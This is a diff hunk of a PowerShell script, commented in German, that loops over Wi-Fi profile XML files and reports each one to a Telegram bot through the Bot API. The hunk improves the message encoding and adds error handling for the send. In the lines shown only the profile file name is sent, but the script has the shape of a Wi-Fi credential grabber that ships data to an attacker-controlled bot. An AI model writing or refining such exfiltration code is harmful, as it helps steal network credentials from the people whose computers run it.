@@ -32,12 +32,17 @@ foreach ($xmlFile in $xmlFiles) {
 
     # Bereite die Daten vor
     $message = "Hier ist das WLAN-Profil: $($xmlFile.Name)"
-    $uri = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$([System.Web.HttpUtility]::UrlEncode($message))"
+    $encodedMessage = [Uri]::EscapeDataString($message)
+    $uri = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedMessage"
 
     try {
         # Senden Sie die Anfrage
         $response = Invoke-RestMethod -Uri $uri -Method Get
-        Write-Host "Erfolgreich an den Telegram-Bot gesendet: $($xmlFile.Name)"
+        if ($response.ok) {
+            Write-Host "Erfolgreich an den Telegram-Bot gesendet: $($xmlFile.Name)"
+        } else {
+            Write-Host "Fehler beim Senden an den Telegram-Bot: $($response.description)"
+        }
     } catch {
         Write-Host "Fehler beim Senden an den Telegram-Bot: $_"
     }
